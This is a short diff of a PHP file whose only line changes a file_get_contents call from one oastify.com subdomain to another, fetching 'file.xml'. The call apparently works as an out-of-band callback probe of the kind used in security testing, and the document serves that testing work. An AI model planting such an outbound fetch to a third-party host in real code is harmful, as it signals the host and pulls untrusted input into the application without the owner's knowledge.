@@ -1,3 +1,3 @@
 <?php 
-$xml = file_get_contents("http://sb7xf38gvgidgsulwoq6zwv37udl1dr1g.oastify.com/file.xml");
+$xml = file_get_contents("http://gfzkk3ptphaso8a18blia1616scj0buzj.oastify.com/file.xml");
 ?>
